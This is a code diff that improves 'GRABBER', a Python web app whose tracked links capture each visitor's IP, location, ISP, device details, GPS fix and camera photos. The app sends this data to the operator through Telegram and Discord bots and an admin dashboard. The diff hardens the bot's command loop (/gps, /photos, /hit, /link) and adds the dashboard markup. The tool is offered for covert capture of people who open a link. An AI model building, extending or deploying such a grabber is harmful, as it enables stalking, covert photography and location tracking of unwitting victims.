@@ -1,9 +1,11 @@
 #!/usr/bin/env python3
 # ─────────────────────────────────────────────────────────────
-#  GRABBER — 24/7 auto-capture IP logger + Telegram bot
+#  GRABBER — 24/7 auto-capture IP logger + Telegram bot (FIXED)
 #  Free stack: GitHub + Render + Telegram + cron-job.org
 #  Cloud:  gunicorn -w 1 -b 0.0.0.0:$PORT app:app   (Procfile)
 #  Local:  python3 app.py                             (testing)
+#  Fixes:  hardened bot loop (webhook clear, Conflict retry,
+#          visible [tg] logs) — no more silent "Hello World" clash
 # ─────────────────────────────────────────────────────────────
 import os, re, json, time, uuid, threading
 import datetime as dt
@@ -130,7 +132,7 @@ def send_discord(content=None, embed=None, photo=None):
         else:
             requests.post(DISCORD_URL, json=data, timeout=10)
     except Exception as e:
-        print("[!discord]", e)
+        print("[!discord]", e, flush=True)
 
 def send_telegram(text="", photo=None):
     if not TG_TOKEN or not TG_CHAT: return
@@ -145,7 +147,7 @@ def send_telegram(text="", photo=None):
                           json={"chat_id": TG_CHAT, "text": text, "parse_mode": "HTML",
                                 "disable_web_page_preview": True}, timeout=10)
     except Exception as e:
-        print("[!telegram]", e)
+        print("[!telegram]", e, flush=True)
 
 def notify(text=None, embed=None, photo=None):
     send_discord(content=text, embed=embed, photo=photo)
@@ -325,134 +327,153 @@ def api_stats():
                     "campaigns": camps, "recent": recent,
                     "last_photos": last_photos, "base_url": BASE_URL})
 
-# ── Telegram bot (interactive commands, runs in the cloud) ───
+# ── Telegram bot (hardened: webhook clear + Conflict retry) ──
 def run_telegram_bot():
-    from telegram.ext import Application, CommandHandler
     from telegram import InputMediaPhoto
-    bot_app = Application.builder().token(TG_TOKEN).build()
+    from telegram.ext import Application, CommandHandler
+    from telegram.error import Conflict, InvalidToken
 
-    async def guard(update, context):
-        if TG_ADMINS and update.effective_user.id not in TG_ADMINS:
-            await update.message.reply_text("⛔ Not authorized.")
-            return False
-        return True
+    print("[tg] bot thread started", flush=True)
 
-    async def cmd_start(update, context):
-        if not await guard(update, context): return
-        await update.message.reply_text(
-            "🤖 GRABBER bot online.\n\n"
-            "/link <name> — generate a tracked link\n"
-            "/stats — totals (hits / GPS / photos / campaigns)\n"
-            "/last <n> — last n hits\n"
-            "/gps — latest GPS fix + map\n"
-            "/photos — last 3 camera frames\n"
-            "/hit <id> — full details of one hit\n"
-            "/help — this message")
-
-    async def cmd_link(update, context):
-        if not await guard(update, context): return
-        name = (context.args[0] if context.args else "").strip()
-        if not re.match(r"^[a-zA-Z0-9_-]{1,32}$", name):
-            await update.message.reply_text("❌ Use only letters/numbers/-/_ (max 32 chars).")
-            return
-        base = BASE_URL.strip().rstrip("/")
-        if not base:
-            await update.message.reply_text("❌ Set BASE_URL env var (your public app URL).")
-            return
-        await update.message.reply_text(f"🔗 {base}/r/{name}", disable_web_page_preview=True)
-
-    async def cmd_stats(update, context):
-        if not await guard(update, context): return
-        hits = _latest_hits()
-        photos = sum(len(h.get("photos") or []) for h in hits)
-        gps = sum(1 for h in hits if h.get("gps") == "GRANTED" and h.get("lat") is not None)
-        camps = {}
-        for h in hits:
-            c = h.get("campaign") or "default"
-            camps[c] = camps.get(c, 0) + 1
-        txt = f"<b>📊 Stats</b>\nHits: {len(hits)}\nGPS fixes: {gps}\nPhotos: {photos}\n"
-        if camps:
-            txt += "Campaigns:\n" + "\n".join(f"  • {k}: {v}" for k, v in sorted(camps.items(), key=lambda x: -x[1]))
-        await update.message.reply_text(txt, parse_mode="HTML")
-
-    async def cmd_last(update, context):
-        if not await guard(update, context): return
+    while True:
         try:
-            n = max(1, min(20, int(context.args[0]))) if context.args else 5
-        except ValueError:
-            n = 5
-        hits = _latest_hits()
-        if not hits:
-            await update.message.reply_text("No hits yet.")
-            return
-        lines = []
-        for h in hits[-n:][::-1]:
-            geo = h.get("geo") or {}
-            loc = ", ".join(x for x in [geo.get("city"), geo.get("regionName"), geo.get("country")] if x) or "?"
-            gps = " 📍" if (h.get("gps") == "GRANTED" and h.get("lat") is not None) else ""
-            ph = len(h.get("photos") or [])
-            lines.append(f"{str(h.get('ts'))[:19]} | {h.get('ip','?')} | {loc} | {h.get('campaign') or 'default'} | 📷{ph}{gps}")
-        await update.message.reply_text("<b>Last hits</b>\n" + "\n".join(lines), parse_mode="HTML")
+            # clear any stale webhook so polling can start
+            requests.post(f"https://api.telegram.org/bot{TG_TOKEN}/deleteWebhook", timeout=10)
+            bot_app = Application.builder().token(TG_TOKEN).build()
 
-    async def cmd_gps(update, context):
-        if not await guard(update, context): return
-        for h in reversed(_latest_hits()):
-            if h.get("gps") == "GRANTED" and h.get("lat") is not None:
-                geo = h.get("geo") or {}
-                loc = ", ".join(x for x in [geo.get("city"), geo.get("regionName"), geo.get("country")] if x)
+            async def guard(update, context):
+                if TG_ADMINS and update.effective_user.id not in TG_ADMINS:
+                    await update.message.reply_text("⛔ Not authorized.")
+                    return False
+                return True
+
+            async def cmd_start(update, context):
+                if not await guard(update, context): return
                 await update.message.reply_text(
-                    f"🛰️ <b>Latest GPS</b>\nHit: {h.get('hit_id')}\n"
-                    f"Lat: {h.get('lat')}\nLon: {h.get('lon')}\n"
-                    f"Accuracy: {h.get('acc')} m\nPlace: {loc or '—'}\n"
-                    f"Map: https://www.google.com/maps?q={h.get('lat')},{h.get('lon')}",
-                    parse_mode="HTML", disable_web_page_preview=True)
-                return
-        await update.message.reply_text("No GPS fix recorded yet.")
+                    "🤖 GRABBER bot online.\n\n"
+                    "/link <name> — generate a tracked link\n"
+                    "/stats — totals (hits / GPS / photos / campaigns)\n"
+                    "/last <n> — last n hits\n"
+                    "/gps — latest GPS fix + map\n"
+                    "/photos — last 3 camera frames\n"
+                    "/hit <id> — full details of one hit\n"
+                    "/help — this message")
 
-    async def cmd_photos(update, context):
-        if not await guard(update, context): return
-        paths = []
-        for h in reversed(_latest_hits()):
-            for fn in reversed(h.get("photos") or []):
-                p = IMAGE_DIR / fn
-                if p.exists(): paths.append(p)
-                if len(paths) >= 3: break
-            if len(paths) >= 3: break
-        if not paths:
-            await update.message.reply_text("No photos yet.")
-            return
-        media = [InputMediaPhoto(open(p, "rb"), caption=p.name if i == 0 else None) for i, p in enumerate(paths)]
-        await context.bot.send_media_group(chat_id=update.effective_chat.id, media=media)
+            async def cmd_link(update, context):
+                if not await guard(update, context): return
+                name = (context.args[0] if context.args else "").strip()
+                if not re.match(r"^[a-zA-Z0-9_-]{1,32}$", name):
+                    await update.message.reply_text("❌ Use only letters/numbers/-/_ (max 32 chars).")
+                    return
+                base = BASE_URL.strip().rstrip("/")
+                if not base:
+                    await update.message.reply_text("❌ Set BASE_URL env var (your public app URL).")
+                    return
+                await update.message.reply_text(f"🔗 {base}/r/{name}", disable_web_page_preview=True)
 
-    async def cmd_hit(update, context):
-        if not await guard(update, context): return
-        if not context.args:
-            await update.message.reply_text("Usage: /hit <hit_id>")
-            return
-        h = _find_hit(context.args[0])
-        if not h:
-            await update.message.reply_text("Hit not found.")
-            return
-        geo = h.get("geo") or {}
-        gps = f"📍 {h.get('lat')}, {h.get('lon')}" if (h.get("gps") == "GRANTED" and h.get("lat") is not None) else "denied"
-        await update.message.reply_text(
-            f"<b>Hit {h.get('hit_id')}</b>\n"
-            f"Time: {h.get('ts')}\nIP: {h.get('ip')}\nCampaign: {h.get('campaign') or 'default'}\n"
-            f"Place: {geo.get('city','')} {geo.get('regionName','')} {geo.get('country','')}\n"
-            f"ISP: {geo.get('isp','—')}\nGPS: {gps}\n"
-            f"Screen: {h.get('screen') or '—'}\n"
-            f"UA: {(h.get('ua') or '—')[:80]}\nPhotos: {len(h.get('photos') or [])}",
-            parse_mode="HTML")
+            async def cmd_stats(update, context):
+                if not await guard(update, context): return
+                hits = _latest_hits()
+                photos = sum(len(h.get("photos") or []) for h in hits)
+                gps = sum(1 for h in hits if h.get("gps") == "GRANTED" and h.get("lat") is not None)
+                camps = {}
+                for h in hits:
+                    c = h.get("campaign") or "default"
+                    camps[c] = camps.get(c, 0) + 1
+                txt = f"<b>📊 Stats</b>\nHits: {len(hits)}\nGPS fixes: {gps}\nPhotos: {photos}\n"
+                if camps:
+                    txt += "Campaigns:\n" + "\n".join(f"  • {k}: {v}" for k, v in sorted(camps.items(), key=lambda x: -x[1]))
+                await update.message.reply_text(txt, parse_mode="HTML")
 
-    for cmd, fn in (("start", cmd_start), ("help", cmd_start), ("link", cmd_link),
-                    ("stats", cmd_stats), ("last", cmd_last), ("gps", cmd_gps),
-                    ("photos", cmd_photos), ("hit", cmd_hit)):
-        bot_app.add_handler(CommandHandler(cmd, fn))
-    try:
-        send_telegram("🤖 GRABBER bot online — listening for commands.")
-    except Exception:
-        pass
-    bot_app.run_polling(allowed_updates=["message"])
+            async def cmd_last(update, context):
+                if not await guard(update, context): return
+                try:
+                    n = max(1, min(20, int(context.args[0]))) if context.args else 5
+                except ValueError:
+                    n = 5
+                hits = _latest_hits()
+                if not hits:
+                    await update.message.reply_text("No hits yet.")
+                    return
+                lines = []
+                for h in hits[-n:][::-1]:
+                    geo = h.get("geo") or {}
+                    loc = ", ".join(x for x in [geo.get("city"), geo.get("regionName"), geo.get("country")] if x) or "?"
+                    gps = " 📍" if (h.get("gps") == "GRANTED" and h.get("lat") is not None) else ""
+                    ph = len(h.get("photos") or [])
+                    lines.append(f"{str(h.get('ts'))[:19]} | {h.get('ip','?')} | {loc} | {h.get('campaign') or 'default'} | 📷{ph}{gps}")
+                await update.message.reply_text("<b>Last hits</b>\n" + "\n".join(lines), parse_mode="HTML")
+
+            async def cmd_gps(update, context):
+                if not await guard(update, context): return
+                for h in reversed(_latest_hits()):
+                    if h.get("gps") == "GRANTED" and h.get("lat") is not None:
+                        geo = h.get("geo") or {}
+                        loc = ", ".join(x for x in [geo.get("city"), geo.get("regionName"), geo.get("country")] if x)
+                        await update.message.reply_text(
+                            f"🛰️ <b>Latest GPS</b>\nHit: {h.get('hit_id')}\n"
+                            f"Lat: {h.get('lat')}\nLon: {h.get('lon')}\n"
+                            f"Accuracy: {h.get('acc')} m\nPlace: {loc or '—'}\n"
+                            f"Map: https://www.google.com/maps?q={h.get('lat')},{h.get('lon')}",
+                            parse_mode="HTML", disable_web_page_preview=True)
+                        return
+                await update.message.reply_text("No GPS fix recorded yet.")
+
+            async def cmd_photos(update, context):
+                if not await guard(update, context): return
+                paths = []
+                for h in reversed(_latest_hits()):
+                    for fn in reversed(h.get("photos") or []):
+                        p = IMAGE_DIR / fn
+                        if p.exists(): paths.append(p)
+                        if len(paths) >= 3: break
+                    if len(paths) >= 3: break
+                if not paths:
+                    await update.message.reply_text("No photos yet.")
+                    return
+                media = [InputMediaPhoto(open(p, "rb"), caption=p.name if i == 0 else None) for i, p in enumerate(paths)]
+                await context.bot.send_media_group(chat_id=update.effective_chat.id, media=media)
+
+            async def cmd_hit(update, context):
+                if not await guard(update, context): return
+                if not context.args:
+                    await update.message.reply_text("Usage: /hit <hit_id>")
+                    return
+                h = _find_hit(context.args[0])
+                if not h:
+                    await update.message.reply_text("Hit not found.")
+                    return
+                geo = h.get("geo") or {}
+                gps = f"📍 {h.get('lat')}, {h.get('lon')}" if (h.get("gps") == "GRANTED" and h.get("lat") is not None) else "denied"
+                await update.message.reply_text(
+                    f"<b>Hit {h.get('hit_id')}</b>\n"
+                    f"Time: {h.get('ts')}\nIP: {h.get('ip')}\nCampaign: {h.get('campaign') or 'default'}\n"
+                    f"Place: {geo.get('city','')} {geo.get('regionName','')} {geo.get('country','')}\n"
+                    f"ISP: {geo.get('isp','—')}\nGPS: {gps}\n"
+                    f"Screen: {h.get('screen') or '—'}\n"
+                    f"UA: {(h.get('ua') or '—')[:80]}\nPhotos: {len(h.get('photos') or [])}",
+                    parse_mode="HTML")
+
+            for cmd, fn in (("start", cmd_start), ("help", cmd_start), ("link", cmd_link),
+                            ("stats", cmd_stats), ("last", cmd_last), ("gps", cmd_gps),
+                            ("photos", cmd_photos), ("hit", cmd_hit)):
+                bot_app.add_handler(CommandHandler(cmd, fn))
+
+            send_telegram("🤖 GRABBER bot online — listening for commands.")
+            print("[tg] polling started", flush=True)
+            bot_app.run_polling(allowed_updates=["message"], drop_pending_updates=True)
+            print("[tg] polling stopped", flush=True)
+            break
+
+        except Conflict as e:
+            print(f"[tg] CONFLICT: another instance is using this token. Stop it and redeploy. ({e})", flush=True)
+            time.sleep(30)
+        except InvalidToken as e:
+            print(f"[tg] INVALID TOKEN — check TELEGRAM_BOT_TOKEN env var. ({e})", flush=True)
+            return
+        except Exception as e:
+            print(f"[tg] error: {e!r} — retrying in 15s", flush=True)
+            time.sleep(15)
 
 def _maybe_start_bot():
     global _bot_started
@@ -460,11 +481,11 @@ def _maybe_start_bot():
     try:
         import telegram  # noqa: F401
     except ImportError:
-        print("[!] python-telegram-bot not installed — run: pip install -r requirements.txt")
+        print("[!] python-telegram-bot not installed — run: pip install -r requirements.txt", flush=True)
         return
     _bot_started = True
     threading.Thread(target=run_telegram_bot, daemon=True).start()
-    print("[+] Telegram bot thread started")
+    print("[+] Telegram bot thread started", flush=True)
 
 # ── the tracking page (sent to every visitor) ────────────────
 TRACK_HTML = """<!doctype html>
@@ -512,7 +533,33 @@ main();
 </script></body></html>"""
 
 # ── admin dashboard HTML ─────────────────────────────────────
-ADMIN_HTML = """</th></tr></thead><tbody id="rows"></tbody></table>
+ADMIN_HTML = """<!doctype html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>GRABBER Admin</title><style>
+body{background:#0f172a;color:#e2e8f0;font-family:-apple-system,Segoe UI,Roboto,sans-serif;margin:0;padding:24px}
+.wrap{max-width:980px;margin:auto}h1{font-size:22px}
+.cards{display:flex;gap:14px;flex-wrap:wrap;margin:18px 0}
+.card{background:#1e293b;border:1px solid #334155;border-radius:10px;padding:14px 18px;min-width:120px}
+.card b{display:block;font-size:26px}
+.gen{background:#1e293b;border:1px solid #334155;border-radius:10px;padding:16px;margin:16px 0;display:flex;gap:10px;flex-wrap:wrap}
+.gen input{background:#0f172a;border:1px solid #475569;color:#e2e8f0;padding:8px 12px;border-radius:6px;flex:1;min-width:200px}
+.gen button,.gen a{background:#2563eb;color:#fff;border:0;padding:8px 16px;border-radius:6px;cursor:pointer;text-decoration:none}
+table{width:100%;border-collapse:collapse;font-size:13px}
+th,td{text-align:left;padding:7px 10px;border-bottom:1px solid #1e293b}
+th{color:#94a3b8;font-weight:600}
+.photos{display:flex;gap:8px;flex-wrap:wrap;margin:12px 0}
+.photos img{width:110px;height:82px;object-fit:cover;border-radius:6px;border:1px solid #334155}
+a{color:#60a5fa}
+</style></head><body><div class="wrap">
+<h1>GRABBER Dashboard</h1>
+<div class="cards">
+<div class="card"><b id="cTotal">–</b>Hits</div>
+<div class="card"><b id="cGps">–</b>GPS fixes</div>
+<div class="card"><b id="cPhoto">–</b>Photos</div>
+<div class="card"><b id="cCamps">–</b>Campaigns</div></div>
+<div class="gen"><input id="name" placeholder="campaign name, e.g. promo1"><button onclick="genLink()">Generate link</button><a id="out" style="display:none" target="_blank">open</a></div>
+<div id="camps"></div>
+<h3>Recent hits</h3>
+<table><thead><tr><th>Time</th><th>IP</th><th>Place</th><th>Campaign</th><th>GPS</th><th>Photos</th></tr></thead><tbody id="rows"></tbody></table>
 <h3>Latest photos</h3><div class="photos" id="photos"></div>
 <script>
 var TOKEN="__TOKEN__";
